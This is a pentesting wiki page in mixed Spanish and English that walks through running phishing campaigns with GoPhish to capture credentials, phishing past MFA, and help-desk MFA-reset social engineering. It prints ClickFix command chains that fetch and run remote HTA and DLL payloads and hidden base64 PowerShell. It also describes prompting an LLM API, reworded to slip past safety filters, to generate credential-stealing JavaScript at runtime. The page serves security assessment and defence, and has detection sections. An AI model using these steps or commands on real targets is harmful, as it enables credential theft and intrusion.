# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Recon del victim
1. Selecciona el **victim domain**.
2. Realiza una enumeración web básica **buscando login portals** usados por el victim y **decide** cuál vas a **impersonate**.
3. Usa algo de **OSINT** para **find emails**.
2. Prepara el entorno
1. **Buy the domain** que vas a usar para la phishing assessment
2. **Configura los registros** relacionados con el email service (SPF, DMARC, DKIM, rDNS)
3. Configura el VPS con **gophish**
3. Prepara la campaign
1. Prepara la **email template**
2. Prepara la **web page** para robar las credentials
4. ¡Lanza la campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: El domain name **contiene** una **keyword** importante del original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Cambia el **dot por un hyphen** de un subdomain (e.g., www-zelster.com).
- **New TLD**: Mismo domain usando un **new TLD** (e.g., zelster.org)
- **Homoglyph**: **Reemplaza** una letra en el domain name con **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Intercambia dos letters** dentro del domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Añade o elimina “s” al final del domain name (e.g., zeltsers.com).
- **Omission**: **Elimina una** de las letters del domain name (e.g., zelser.com).
- **Repetition:** **Repite una** de las letters del domain name (e.g., zeltsser.com).
- **Replacement**: Como homoglyph pero menos stealthy. Reemplaza una de las letters del domain name, quizá con una letter en proximidad de la original en el keyboard (e.g, zektser.com).
- **Subdomained**: Introduce un **dot** dentro del domain name (e.g., ze.lster.com).
- **Insertion**: **Inserta una letter** en el domain name (e.g., zerltser.com).
- **Missing dot**: Añade el TLD al domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe la **posibilidad de que uno de algunos bits almacenados o en comunicación se invierta automáticamente** debido a varios factores como erupciones solares, rayos cósmicos o errores de hardware.

Cuando este concepto se **aplica a DNS requests**, es posible que el **domain received by the DNS server** no sea el mismo que el domain solicitado inicialmente.

Por ejemplo, una sola modificación de bit en el domain "windows.com" puede cambiarlo a "windnws.com."

Los attackers pueden **aprovechar esto registrando múltiples bit-flipping domains** similares al domain del victim. Su intención es redirigir a usuarios legítimos a su propia infraestructura.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Puedes buscar en [https://www.expireddomains.net/](https://www.expireddomains.net) un expired domain que podrías usar.\
Para asegurarte de que el expired domain que vas a comprar **ya tiene un buen SEO** puedes buscar cómo está categorizado en:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descubrir más** direcciones de email válidas o **verificar las que** ya has descubierto, puedes comprobar si puedes hacer brute-force a sus smtp servers del victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Además, no olvides que si los users usan **algún web portal para acceder a sus mails**, puedes comprobar si es vulnerable a **username brute force**, y explotar la vulnerabilidad si es posible.

## Configuring GoPhish

### Installation

Puedes descargarlo desde [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Descárgalo y descomprímelo dentro de `/opt/gophish` y ejecuta `/opt/gophish/gophish`\
Se te mostrará una password para el admin user en el port 3333 en la salida. Por lo tanto, accede a ese port y usa esas credentials para cambiar la admin password. Puede que necesites tunelizar ese port a local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuración del certificado TLS**

Antes de este paso ya deberías haber **comprado el dominio** que vas a usar y debe estar **apuntando** a la **IP del VPS** donde estás configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuración de Mail**

Empieza instalando: `apt-get install postfix`

Luego añade el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia también los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finalmente modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** con el nombre de tu dominio y **reinicia tu VPS.**

Ahora, crea un **registro DNS A** de `mail.<domain>` apuntando a la **ip address** del VPS y un **registro DNS MX** apuntando a `mail.<domain>`

Ahora vamos a probar a enviar un email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuración de Gophish**

Detén la ejecución de gophish y vamos a configurarlo.\
Modifica `/opt/gophish/config.json` con lo siguiente (nota el uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar el servicio gophish**

Para crear el servicio gophish para que pueda iniciarse automáticamente y administrarse como un servicio, puedes crear el archivo `/etc/init.d/gophish` con el siguiente contenido:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Finaliza la configuración del servicio y compruébalo haciendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando servidor de correo y dominio

### Espera y sé legítimo

Cuanto más antiguo sea un dominio, menos probable es que sea detectado como spam. Entonces deberías esperar todo el tiempo posible (al menos 1 semana) antes de la evaluación de phishing. además, si pones una página sobre un sector reputacional, la reputación obtenida será mejor.

Ten en cuenta que incluso si tienes que esperar una semana, puedes terminar de configurar todo ahora.

### Configurar el registro Reverse DNS (rDNS)

Establece un registro rDNS (PTR) que resuelva la dirección IP del VPS al nombre de dominio.

### Sender Policy Framework (SPF) Record

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Este es el contenido que debe establecerse dentro de un registro TXT dentro del dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Tienes que crear un nuevo registro DNS TXT apuntando al hostname `_dmarc.<domain>` con el siguiente contenido:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Debes **configurar un DKIM para el nuevo dominio**. Si no sabes qué es un registro DMARC [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial está basado en: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Necesitas concatenar ambos valores B64 que genera la clave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Prueba la puntuación de tu configuración de correo electrónico

Puedes hacerlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Solo accede a la página y envía un correo a la dirección que te dan:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
También puedes **comprobar tu configuración de correo electrónico** enviando un email a `check-auth@verifier.port25.com` y **leyendo la respuesta** (para esto necesitarás **abrir** el puerto **25** y ver la respuesta en el archivo _/var/mail/root_ si envías el email como root).\
Comprueba que pasas todas las pruebas:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
También podrías enviar **un mensaje a un Gmail bajo tu control**, y comprobar los **encabezados del correo** en tu bandeja de entrada de Gmail; `dkim=pass` debería estar presente en el campo `Authentication-Results` del encabezado.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

La página [www.mail-tester.com](https://www.mail-tester.com) puede indicarte si tu dominio está siendo bloqueado por spamhouse. Puedes solicitar que tu dominio/IP sea eliminado en: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Puedes solicitar que tu dominio/IP sea eliminado en [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Establece algún **nombre para identificar** el perfil del remitente
- Decide desde qué cuenta vas a enviar los emails de phishing. Sugerencias: _noreply, support, servicedesk, salesforce..._
- Puedes dejar en blanco el username y password, pero asegúrate de marcar Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Se recomienda usar la funcionalidad "**Send Test Email**" para comprobar que todo funciona.\
> Te recomendaría **enviar los emails de prueba a direcciones de 10min mails** para evitar que te bloqueen al hacer pruebas.

### Email Template

- Establece algún **nombre para identificar** la plantilla
- Luego escribe un **subject** (nada estrafalario, solo algo que podrías esperar leer en un email normal)
- Asegúrate de haber marcado "**Add Tracking Image**"
- Escribe la **email template** (puedes usar variables como en el siguiente ejemplo):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Write a **name**
- **Write the HTML code** of the web page. Note that you can **import** web pages.
- Mark **Capture Submitted Data** and **Capture Passwords**
- Set a **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_

> [!TIP]
> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.

### Users & Groups

- Set a name
- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims

Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

Once everything is ready, just launch the campaign!

## Website Cloning

If for any reason you want to clone the website check the following page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
Check out the following page for some examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.

This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:

1. You **impersonate the login** form of the real webpage.
2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.

### Via VNC

What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)

However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:


{{#ref}}
detecting-phising.md
{{#endref}}

You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT)** / **Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
* Monitor for child processes of browsers opening installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Some fake software portals keep the visible download `href` pointing to the **real** GitHub/release URL but hijack the **first** user interaction in JavaScript and send the victim into a **Traffic Distribution System (TDS)** chain instead.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Rasgos clave:
- El hook suele ejecutarse en la **capture phase** (`true`) sobre `document`, así que se dispara antes que los handlers del sitio.
- Chrome a menudo usa `mousedown` en lugar de `click` para mantener la redirección vinculada a un **user gesture** válido y mejorar el bypass del popup-blocker.
- Algunas variantes abren previamente `about:blank` o sintetizan clics en `<a target="_blank">` y solo después asignan la URL del TDS.
- Los límites del lado del navegador normalmente viven en `localStorage`, así que el **primer clic** puede llegar a malware mientras que los refreshes/retries vuelven al enlace visible de apariencia benigna.
- El TDS puede filtrar por referrer, entry domain, GEO, browser/device fingerprint, comprobaciones de VPN/datacenter, contexto del clic y contadores por sesión, haciendo que las reproducciones del analista no sean deterministas.

Ideas para defender:
- Compara el `href` **mostrado** con el destino de navegación **real** generado en tiempo de clic.
- Busca handlers `document.addEventListener(..., true)` que llamen tanto a `preventDefault()` como a `stopImmediatePropagation()` alrededor de `window.open`, `about:blank` o clics sintéticos de anchor.
- Trata como patrón de alto valor para SEO-poisoning/TDS los clústeres de dominios recién registrados de software-download que cargan todos la misma etapa de CloudFront/JS.

### ClickFix desde páginas de verificación falsas + fetches LOLBAS con apariencia de archivo archive
Algunas ramas del TDS terminan en una página de verificación falsa (estilo Cloudflare/IUAM) que le indica a la víctima ejecutar un binario confiable de Windows como:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` ejecuta el **HTA/VBScript al inicio de la respuesta**, incluso si la URL finge ser un archivo `.7z`; los datos de archivo añadidos pueden ser puro señuelo.
- Las etapas posteriores suelen seguir mintiendo sobre el tipo de archivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs con binarios rellenados) y luego cambiar a **manual PE mapping / in-memory execution**.
- Si estás respondiendo a una de estas cadenas, conserva **network + memory desde la primera ejecución exitosa**: las replays posteriores pueden mostrar solo una ruta de instalador/SFX benigna o fallar porque el payload/clave de liberación estaba ligado a la sesión TDS original.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory nacional CERT clonado con un botón **Update** que muestra instrucciones paso a paso de “fix”. Se indica a las víctimas que ejecuten un batch que descarga una DLL y la ejecuta mediante `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deja caer el payload en `%TEMP%`, una breve pausa oculta el jitter de red, y luego `rundll32` llama al entrypoint exportado (`notepad`).
* La DLL hace beaconing de la identidad del host y consulta C2 cada pocos minutos. La asignación remota llega como **base64-encoded PowerShell** ejecutado oculto y con policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Esto preserva la flexibilidad de C2 (el servidor puede cambiar tareas sin actualizar la DLL) y oculta ventanas de consola. Busca hijos de PowerShell de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` juntos.
* Los defensores pueden buscar callbacks HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` y intervalos de polling de 5 minutos después de cargar la DLL.

---

## AI-Enhanced Phishing Operations
Los atacantes ahora encadenan **LLM & voice-clone APIs** para señuelos totalmente personalizados e interacción en tiempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generar y enviar >100 k emails / SMS con wording aleatorizado y tracking links.|
|Generative AI|Producir emails *one-off* que referencian M&A públicas, chistes internos de redes sociales; deep-fake CEO voice en callback scam.|
|Agentic AI|Registrar dominios de forma autónoma, scrape open-source intel, crear correos de siguiente etapa cuando una víctima hace clic pero no envía credenciales.|

**Defence:**
• Añade **dynamic banners** que destaquen mensajes enviados desde automatización no confiable (mediante anomalías ARC/DKIM).
• Despliega **voice-biometric challenge phrases** para solicitudes telefónicas de alto riesgo.
• Simula continuamente señuelos generados por IA en programas de awareness – las plantillas estáticas están obsoletas.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Los atacantes pueden enviar HTML aparentemente benigno y **generar el stealer at runtime** pidiendo a una **trusted LLM API** JavaScript, y luego ejecutándolo en el navegador (p. ej., `eval` o `<script>` dinámico).

1. **Prompt-as-obfuscation:** codifica exfil URLs/Base64 strings en el prompt; itera el wording para eludir filtros de seguridad y reducir alucinaciones.
2. **Client-side API call:** al cargar, JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; solo el prompt/API call está presente en el HTML estático.
3. **Assemble & exec:** concatena la respuesta y ejecútala (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** el code generado personaliza el lure (p. ej., parsing de token de LogoKit) y envía credenciales al endpoint oculto por el prompt.

**Rasgos de evasión**
- El tráfico llega a dominios de LLM conocidos o proxies CDN reputados; a veces vía WebSockets a un backend.
- No hay payload estático; el JS malicioso existe solo después del render.
- Las generaciones no deterministas producen **stealers** únicos por sesión.

**Ideas de detección**
- Ejecuta sandboxes con JS habilitado; marca **`eval`/creación dinámica de scripts en runtime procedentes de respuestas de LLM**.
- Busca POSTs de front-end a APIs de LLM seguidos inmediatamente por `eval`/`Function` sobre el texto devuelto.
- Alerta sobre dominios de LLM no autorizados en el tráfico del cliente más posteriores POSTs de credenciales.

---

## Variante de MFA Fatigue / Push Bombing – Forced Reset
Además del push-bombing clásico, los operadores simplemente **fuerzan un nuevo registro de MFA** durante la llamada al help-desk, anulando el token existente del usuario. Cualquier prompt de inicio de sesión posterior parece legítimo para la víctima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor para eventos de AzureAD/AWS/Okta donde **`deleteMFA` + `addMFA`** ocurran **dentro de minutos desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without any download or attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
* Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` lógica (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour often observed:
- Establece una cookie de sesión durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o un placeholder) en los GET posteriores cuando `is_mobile=false`; solo sirve phishing si `true`.

Hunting and detection heuristics:
- Consulta de urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para no móvil; las rutas legítimas de víctimas móviles devuelven 200 con HTML/JS de seguimiento.
- Bloquea o examina páginas que condicionen el contenido exclusivamente en `ontouchstart` o comprobaciones de dispositivo similares.

Defence tips:
- Ejecuta crawlers con fingerprints similares a móvil y JS habilitado para revelar contenido restringido.
- Alerta ante respuestas 500 sospechosas después de `POST /detect` en dominios recién registrados.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
